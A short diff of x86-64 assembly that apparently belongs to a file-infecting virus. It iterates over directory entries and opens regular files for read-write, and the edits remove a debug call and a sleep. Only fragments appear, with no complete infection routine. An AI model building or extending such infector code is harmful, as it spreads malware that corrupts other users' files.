@@ -68,7 +68,7 @@
 section .text
 	global _start
 _start:
-	mov r14, [rsp + 8]											; saving argv0 to r14
+	mov r14, [rsp + 8]										; saving argv0 to r14
 	push rdx
 	push rsp
 	sub rsp, 5000												; reserving 5000 bytes
@@ -122,7 +122,6 @@ _start:
 		cmp byte [r15 + 418 + rcx], DT_REG					; if its a regular file
 		jne .continue
 		.open_target_file:
-			; call print_dot
 			lea rdi, [rcx + r15 + 419]						; dirent.d_name = [r15 + 419]
 			mov rsi, O_RDWR
 			xor rdx, rdx
@@ -308,8 +307,6 @@ cleanup:
 	pop rsp
 	pop rdx
 _end:
-	mov rax, 35 ; nanosleep
-	mov rdi, 100000
 	xor rdi, rdi
 	mov rax, SYS_EXIT
 	syscall
